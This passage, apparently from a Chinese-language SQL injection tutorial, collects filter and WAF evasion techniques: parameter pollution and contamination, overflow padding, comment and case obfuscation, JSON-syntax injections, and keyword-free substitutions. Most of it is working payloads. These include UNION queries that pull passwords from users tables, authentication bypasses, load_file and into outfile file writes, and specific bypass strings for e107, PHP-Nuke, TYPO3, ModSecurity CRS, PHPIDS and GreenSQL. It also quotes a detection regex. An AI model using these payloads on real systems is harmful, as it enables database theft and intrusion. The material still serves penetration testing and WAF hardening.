`select * from table where a=1 union/* and b=*/select 1,pass/* limit */from users—`
看完上面两个示例发现和HPP最后一个示例很像，不同之处在于参数不一样，这里是在不同的参数之间进行分割，结果到了数据库执行查询时再合并语句。
3.HPC(HTTP Parameter Contamination)
这一概念见于Beyond SQLi: Obfuscate and Bypass这里Contamination意为污染
RFC2396定义了如下一些字符
```
Unreserved: a-z, A-Z, 0-9 and _ . ! ~ * ' ()  
Reserved : ; / ? : @ & = + $ ,  
Unwise : { } | \ ^ [ ] `
```
不同的Web服务器处理处理构造得特殊请求时有不同的逻辑
![waf2](../pictures/wafi2.png)
以魔术字符%为例，Asp/Asp.net会受到影响
![waf3](../pictures/wafi3.png)
### h) 缓冲区溢出(Advanced)
缓冲区溢出用于对付WAF在内的软件，本身有不少WAF是C语言写的，而C语言自身没有缓冲区保护机制，因此如果WAF在处理测试向量时超出了其缓冲区长度就会引发bug，从而实现绕过
举例
`?id=1 and (select 1)=(Select 0xA*1000)+UnIoN+SeLeCT+1,2,version(),4,5,database(),user(),8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26`
示例 0xA*1000 指0xA后面 'A' 重复1000次，一般来说对应用软件构成缓冲区溢出都需要较大的测试长度，这里1000只做参考，也许在有些情况下可能不需要这么长也能溢出
### i) 整合绕过
整合的意思是结合使用前面谈到的各种绕过技术，单一的技术可能无法绕过过滤机制，但是多种技术的配合使用成功的可能性就会增加不少了。这一方面来说关系到总体与局部，
另一方面则是多种技术的使用创造了更多的可能性组合，除非每一种技术单独都无法使用，否则它们能产生比自身大得多的能量。
举例
``` 
z.com/index.php?page_id=-15+and+(select 1)=(Select 0xAA[..(add about 1000 "A")..])+/*!uNIOn*/+/*!SeLECt*/+1,2,3,4…
id=1/*!UnIoN*/+SeLeCT+1,2,concat(/*!table_name*/)+FrOM /*information_schema*/.tables /*!WHERE */+/*!TaBlE_ScHeMa*/
	+like+database()– -
?id=-725+/*!UNION*/+/*!SELECT*/+1,GrOUp_COnCaT(COLUMN_NAME),3,4,5+FROM+/*!INFORMATION_SCHEM*/.COLUMNS+WHERE
	+TABLE_NAME=0x41646d696e--  
```
### j) json 格式绕过
![image](https://user-images.githubusercontent.com/5785346/208339891-af7707a5-9f16-4533-ab69-bfae07a9e6ea.png)
The New ‘ or ‘a’=’a
Using JSON syntax, it is possible to craft new SQLi payloads. These payloads, since they are not commonly known, could be used to fly under the radar and bypass many security tools. Using syntax from different database engines, we were able to compile the following list of true statements in SQL:
PostgreSQL: `'{"b":2}'::jsonb  '$.c[2].f' = 7` Does the extracted value of this JSON equals 7? True. 
MySQL: `JSON_EXTRACT('{"id": 14, "name": "Aztalan"}', '$.name') = 'Aztalan'` Does the extracted value of this JSON equals to ‘Aztalan’? True.
![image](https://user-images.githubusercontent.com/5785346/208339982-df4bc8ab-f825-4034-8fc1-ddb04059a226.png)
![image](https://user-images.githubusercontent.com/5785346/208340020-fb416d7a-1230-4b4c-8f14-5121cdacde0c.png)
## 0x03 SQLi Filter的实现及Evasion
SQL Injection 时用得最多的一些关键字如下
`and, or, union, where, limit, group by, select, ', hex, substr, white space`
对它们的检测完整正则表达式为
`preg_match('/(and|or|union|where|limit|group by|select|\'|hex|substr|\s)/i', $id)`
Filter Evasion在Beyond SQLi: Obfuscate and Bypass 以看到比较详细的解释
这里只做简化的说明其应对方式依次为 
``` sql
***note***:"=>"左边表示会被Filtered的语句，"=>"右边表示成功Bypass的语句，
左边标红的为被Filtered的关键字，右边标蓝的为替代其功能的函数或关键字
and => &&   or => ||
union select user, password from users   =>  1 || (select user from users where user_id = 1) = 'admin
1 || (select user from users where user_id = 1) = 'admin'  =>  1 || (select user from users limit 1) = 'admin
1 || (select user from users limit 1) = 'admin' =>  1 || (select user from users group by user_id having user_id = 
1) = 'admin'
1 || (select user from users group by user_id having user_id = 1) = 'admin' => 1 || (select substr(group_concat
	(user_id),1,1) user from users )=1
1 || (select substr(group_concat(user_id),1,1) user from users) = 1 =>  1 || 1 = 1 into outfile 'result.txt' 或者  
1 || substr(user,1,1) = 'a' 
1 || (select substr(group_concat(user_id),1,1) user from users) = 1  =>  1 || user_id is not null 或者 1 || 
	substr(user,1,1) = 0x61 或者 1 || substr(user,1,1) = unhex(61)  // ' Filtered
1 || substr(user,1,1) = unhex(61)  =>   1 || substr(user,1,1) = lower(conv(11,10,36))
1 || substr(user,1,1) = lower(conv(11,10,36)) =>  1 || lpad(user,7,1)
1 || lpad(user,7,1)  =>  1%0b||%0blpad(user,7,1)  // ' ' Filtered
```
从上面给出的示例来看没有绝对的过滤，即便平时构建一个正常SQL语句的全部关键字都被过滤了，我们也还是能找到Bypass的方法。普世的阳光和真理尚且照不到每一个角落人，为构建出来的一个工具WAF就更加不可能尽善尽美了。我们可以相信WAF能为我们抵挡很多攻击，但是绝不能百分之一百的依赖它，就算它有着世上最为健全的规则它本身也是会存在缺陷的。
从前面到现在基本上每条注入语句中都有数字，如果某查询的数据类型为字符串、或者做了严格限制数字要被和谐掉，这就有点棘手了，不过办法总是有的
![waf4](../pictures/wafi4.png)
![waf5](../pictures/wafi5.png)
上面两张图第一张是不能使用数字时通过使用数学函数得到某个数字的值，第二张则是这些数字对应的36进制的值。
因此有时候一个很简单的表达式可能会很复杂，或者非常长，其实际就是计算mod(a,b)
``` sql
(mod(length(trim(leading(concat(lower(conv(version()*(true+pi()),pi()*pi(),pow(pi(),pi()))),
lower(conv(pi()*pi()*pi()-pi()-pi(),pi()*pi(), pow(pi(),pi()))),lower(conv(pi()*version(),pi()*pi(),pow(pi(),pi()))),
conv(version()*(true+pi()),pi()*pi(),pow(pi(),pi())),lower(conv(pi()*pi()*pi()-pi()-pi(),pi()*pi(),pow(pi(),pi()))),
lower(conv(pi()*version(),pi()*pi(),pow(pi(),pi()))),lower(conv(ceil(pi()*version())+true,pi()*pi(),pow(pi(), pi()))),
lower(conv(ceil((pi()+ceil(pi()))*pi()),pi()*pi(),pow(pi(),pi()))),lower(conv(ceil(pi())*ceil(pi()+pi()),pi()*pi
(),pow(pi(),pi()))),
conv(ceil(pi()*version()),pi()*pi(),pow(pi(),pi())),lower(conv(ceil(pi()*pi()+pi()),pi()*pi(),pow(pi(),pi()))),
lower(conv(ceil(version()*version()),pi()*pi(),pow(pi(),pi()))),lower(conv(ceil(pi()*pi()+pi()),pi()*pi(),pow(pi
(),pi())))))from(pass))),length(pass))
```
## 0x04 延伸及测试向量示例
a) CMS绕过实例
b) WAF绕过示例
c) SQLi Filter Evasion Cheat sheet
d) 测试向量
a) Web应用绕过示例
1. e107 CMS
``` php 
	$inArray = array("'", ";", "/**/", "/UNION/", "/SELECT/", "AS "); 
	if (strpos($_SERVER['PHP_SELF'], "trackback") === false) { 
	foreach($inArray as $res) { 
	if(stristr($_SERVER['QUERY_STRING'], $res)) { 
	die("Access denied."); 
	}}}
```
Bypass:
`vuln.php/trackback?inject=UNI%6fN SELECT`  
2. PHP-Nuke CMS  
``` php
	if(isset($_SERVER['QUERY_STRING']) && (!stripos($_SERVER['QUERY_STRING'], "ad_click"))) { 
		$queryString = $_SERVER['QUERY_STRING']; 
		if ( stripos($queryString, '%20union%20') 
			OR stripos($queryString, '/*') 
			OR stripos($queryString, '*/union/*') 
			OR stripos($queryString, '+union+') 
			OR stripos($queryString, 'concat')) 
		{ die('Illegal Operation'); }
```
Bypass:  
`vuln.php?inject=%a0UNI%6fN(SELECT'ad_click'`  
3. TYPO3 CMS  
`$val = str_replace(array("'"," ","("),"",$arrFields[$fname]); // basic defence`  
Bypass:  
vuln.php?id=1/&#42;&#42;/union%a0select/&#42;&#42;/1,pass,3&#96;a&#96;from&#96;users&#96;   
b) WAF绕过示例
1. ModSecurity CRS 2.0.9
``` sql
1'and 0x61=(/*foo*/SELECT mid(pass,1,1) from users limit 1,1)and'1
1'union/*!select*/pass,load_file(0x123456789)from users-- -
```
2. PHPIDS 0.6.4
```  sql
foo'!=@a:=0x1 div'1a false != true   //auth bypass
foo'div count(select`pass`from(users)where mid(pass,1,1)rlike lower(conv(10,pi()*pi(),pi()*pi())) )-'0
a'in(true) and false */*!(true)union#newline select pass`alias`from users where true*/* n'1
```
3. GreenSQL 1.3.0 
检测关键字：union, information_schema, into outfile, current_user, current_date, version
检测函数：mid(), substring(), substr(), load_file(), benchmark(), user(), database(), version()
``` sql
adm' 'in' or 1='1        // auth bypass
'-(1)union(select table_name,load_file('/tmp/test'),@@version
from /*! information_schema.tables */);%00    //select union
'-'' into%a0outfile '/tmp/test   //write to file
```
c) SQLi Filter Evasion Cheat sheet
``` sql
#注释
' or 1=1#
' or 1=1/* (MySQL >, <=, <=, ,, XOR, DIV, LIKE, SOUNDS LIKE, RLIKE, REGEXP, LEAST,
GREATEST, CAST, CONVERT, IS, IN, NOT, MATCH, AND, OR, BINARY, BETWEEN, ISNULL 
#空格
%20 %09 %0a %0b %0c %0d %a0 /**/
'or+(1)sounds/**/like"1"–%a0-
'union(select(1),tabe_name,(3)from`information_schema`.`tables`)#
#有引号的字符串
SELECT 'a'
SELECT "a"